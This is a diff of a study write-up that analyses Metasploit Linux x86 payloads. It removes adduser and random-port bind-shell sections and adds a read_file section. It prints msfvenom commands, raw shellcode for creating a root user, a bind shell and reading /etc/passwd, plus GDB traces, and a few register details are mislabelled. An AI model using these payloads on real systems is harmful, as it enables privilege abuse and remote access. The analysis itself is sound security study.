@@ -1,47 +1,47 @@
-# Exercise 5
 
-## 5.1 Payload *linux/x86/adduser*
+## 5.2 Payload *linux/x86/read_file*
 
 ### Check options
 ```
-msfvenom -p linux/x86/adduser --list-options
+msfvenom -p linux/x86/read_file --list-options
 ```
 
-![Screenshot](images/adduser/1.png)
+![Screenshot](../images/read_file/1.png)
 
-![Screenshot](images/adduser/2.png)
+![Screenshot](../images/read_file/2.png)
 
 
 There are 3 basic options:
 
-- PASS: The password for this user (Required). Default: metasploit
-- SHELL: The shell for this user. Default: /bin/sh
-- USER: The username to create (Required). Default: metasploit
+- FD: The file descriptor to write output to (Required). Default: 1
+- PATH: The file path to read (Required)
 
-For this study we will use the three basic options:
+
+For this study we will use the basic options:
 
 ```
-msfvenom -p linux/x86/adduser USER=ricardo PASS=sectube SHELL=/bin/bash --platform=Linux -a x86 -f c
+msfvenom -p linux/x86/read_file FD=1 PATH=/etc/passwd --platform=Linux -a x86 -f c
 ```
+
 
 ### One-liner for getting shellcode 
 
 The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
 
 ```
-msfvenom -p linux/x86/adduser --platform=Linux -a x86 -f c USER=ricardo PASS=sectube SHELL=/bin/bash | grep '"' | sed -e 's/\"//g' | paste -sd "" - | tr ";" " "
+msfvenom -p linux/x86/read_file --platform=Linux -a x86 -f c FD=1 PATH=/etc/passwd | grep '"' | sed -e 's/\"//g' | paste -sd "" - | tr ";" " "
 ```
 
 Using it, we get the shellcode we will use for the study of the payload:
 
-![Screenshot](images/adduser/3.png)
+![Screenshot](../images/read_file/3.png)
 
 
 ### Libemu
 
 Libemu does not show any output in this case:
 
-![Screenshot](images/adduser/4.png)
+![Screenshot](../images/read_file/4.png)
 
 When the PNG picture is generated it is empty.
 
@@ -51,24 +51,29 @@ When the PNG picture is generated it is empty.
 With ndisasm it is possible to get the .nasm code using:
 
 ```
-echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
+msfvenom -p linux/x86/read_file --platform=Linux -a x86 -f raw FD=1 PATH=/etc/passwd | ndisasm -u -
 ```
 
-![Screenshot](images/adduser/5.png)
+
+Or a little quicker:
+
+```
+echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
+```
+
+
+![Screenshot](../images/read_file/5.png)
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
 ```
-echo -e "section .text\nglobal _start \n_start:" > 1.nasm
+echo -e "section .text\nglobal _start \n_start:" > 2.nasm
 
-echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 1.nasm
+echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 2.nasm
 ```
 
-![Screenshot](images/adduser/6.png)
+![Screenshot](../images/read_file/6.png)
 
-It seems ok:
-
-![Screenshot](images/adduser/7.png)
 
 With a little bit of indentation, the nasm file is created and ready to be studied. 
 
@@ -79,198 +84,140 @@ Given we have the nasm code, the first thing to do will be studying the differen
 
 In this case we have four syscalls:
 
-![Screenshot](images/adduser/8.png)
-
-The most important in this case is checking the value of the register EAX to check what type of syscall is being used. The two first syscalls seem to use the values 0x46 and 0x5 (we will check later using GDB):
-
-![Screenshot](images/adduser/9.png)
+![Screenshot](../images/read_file/7.png)
 
 
-The two last syscalls seem to use the values 0x4 and 0x1:
+After checking the */usr/include/i386-linux-gnu/asm/unistd_32.h* file, the syscalls seem to be:
 
-![Screenshot](images/adduser/10.png)
+- Syscall 1 (Value 0x5 or 5 in decimal): open() - *It opens the file specified by pathname*.
 
-
-After checking the /usr/include/i386-linux-gnu/asm/unistd_32.h file, the syscalls seem to be:
-
-- Syscall 1 (Value 0x46 or 70 in decimal): setreuid() - *It sets real and effective user IDs of the calling process*.
-
-- Syscall 2 (Value 0x5 or 5 in decimal): open() - *It opens the file specified by pathname*.
+- Syscall 2 (Value 0x3 or 3 in decimal): read() - *attempts  to  read up to count bytes from file descriptor fd into the buffer starting at buf.*
 
 - Syscall 3 (Value 0x4 or 4 in decimal): write()
 
 - Syscall 4 (Value 0x1 or 1 in decimal): exit() - *It causes normal process termination and the value of status & 0377 is returned to the parent*
 
 
+
+### Generating the executable
+
+Next, the executable gets generated using the *shellcode.c* script:
+
+![Screenshot](../images/read_file/8.png)
+
+It is compiled:
+
+```
+gcc -fno-stack-protector -z execstack shellcode.c -o 2
+```
+
+An executable named "2" gets generated. It is possible to execute it and check the output:
+
+![Screenshot](../images/read_file/9.png)
+
+
+Also note that if we study the binary there are interesting strings we can find (this one will appear again later):
+
+![Screenshot](../images/read_file/10.png)
+
+
 ### Study with GDB
 
-
-
-## 5.2 Payload *linux/x86/read_file*
-
-### Check options
-```
-msfvenom -p linux/x86/read_file --list-options
-```
-
-
-
-
-
-
-
-
-
-
-## 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
-
-### Check options
-```
-msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
-```
-
-![Screenshot](images/randbind/1.png)
-
-![Screenshot](images/randbind/2.png)
-
-There is not any basic option in this case.
-
-For this study we will use the basic command:
+First, the executable is attached in quiet mode:
 
 ```
-msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
+gdb -q 1
 ```
+Then, we set the disassembly flavor, define the "hook-stop" function, and jump into the "main" function (the one from shellcode.c):
 
-### One-liner for getting shellcode 
+![Screenshot](../images/read_file/11.png)
 
-The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
+Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).
 
-```
-msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | grep '"' | sed -e 's/\"//g' | paste -sd "" -
-```
+We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the four syscalls can be read:
 
-Using it, we get the shellcode we will use for the study of the payload:
+![Screenshot](../images/read_file/12.png)
 
-![Screenshot](images/adduser/3.png)
+In 0x00404040 there is a jump (JMP) to 0x404078 which immediately calls 0x00404042. This is obviously a JMP-CALL-POP so we will read the values after 0x404078, which contain "/etc/passwd"
 
+![Screenshot](../images/read_file/13.png)
 
-### Libemu
+Now, we will set a breakpoint before every syscall: 0x0040404a, 0x0040405c, 0x0040406a and 0x00404076.
 
-In this case Libemu works correctly:
-
-```
-echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
-```
-
-![Screenshot](images/adduser/4.png)
-
-We get the next output:
-
-```
-int socket (
-     int domain = 2;
-     int type = 1;
-     int protocol = 0;
-) =  14;
-int listen (
-     int s = 14;
-     int backlog = 0;
-) =  0;
-int accept (
-     int sockfd = 14;
-     sockaddr_in * addr = 0x00000000 => 
-         none;
-     int addrlen = 0x00000002 => 
-         none;
-) =  19;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 14;
-) =  14;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 13;
-) =  13;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 12;
-) =  12;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 11;
-) =  11;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 10;
-) =  10;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 9;
-) =  9;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 8;
-) =  8;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 7;
-) =  7;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 6;
-) =  6;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 5;
-) =  5;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 4;
-) =  4;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 3;
-) =  3;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 2;
-) =  2;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 1;
-) =  1;
-int dup2 (
-     int oldfd = 19;
-     int newfd = 0;
-) =  0;
-int execve (
-     const char * dateiname = 0x00416fb6 => 
-           = "/bin//sh";
-     const char * argv[] = [
-           = 0xffffffff => 
-             none;
-     ];
-     const char * envp[] = 0x00000000 => 
-         none;
-) =  0;
-```
-The list of syscalls in order is:
-
-- Socket
-
-- Listen
-
-- Accept
-
-- Dup2
-
-- Execve
+![Screenshot](../images/read_file/14.png)
 
 
-Finally the PNG picture is created using:
 
-```
-dot randbind.dot -T png -o randbind.png
-```
+We reach the first syscall:
 
-![Screenshot](images/adduser/5.png)
+![Screenshot](../images/read_file/15.png)
+
+We read the man page of open:
+
+![Screenshot](../images/read_file/16.png)
+
+And then the values are:
+
+- EAX = 5 => Syscall is open()
+
+- EBX = 4210813 => The address of "/etc/passwd" string
+
+![Screenshot](../images/read_file/17.png)
+
+- ECX = 0 => These are the flags values. In this case it is only needed the read permission.
+
+
+
+We reach the second syscall:
+
+![Screenshot](../images/read_file/18.png)
+
+We read the man page of read:
+
+![Screenshot](../images/read_file/19.png)
+
+And then the values are:
+
+- EAX = 3 => Syscall is read()
+
+- EBX = 3 => File descriptor to use
+
+- ECX = -1073745156 => Contains the value of the file read (the content of the stack)
+
+- EDX = 4096 => 4096 bytes will be read
+
+
+
+We reach the third syscall:
+
+![Screenshot](../images/read_file/20.png)
+
+We read the man page of write in here: https://linux.die.net/man/2/write
+
+And then the values are:
+
+- EAX = 4 => Syscall is write()
+
+- EBX = 1 => File descriptor is 1 (STDIN)
+
+- ECX = -1073745156 => Address of the characters to write
+
+- EDX = -14 => In the address 0x0040405e, EAX value is copied to EDX because read() on success returns the number of bytes read. In this case, the read() syscall returns -14. 
+
+
+
+
+We reach the fourth syscall:
+
+![Screenshot](../images/read_file/21.png)
+
+We read the man page of exit:
+
+![Screenshot](../images/read_file/22.png)
+
+And then the values are:
+
+- EAX = 1 => Syscall is exit()
+
+- EBX = 0 => Status 0 will represent the program finished correctly in this case.
+
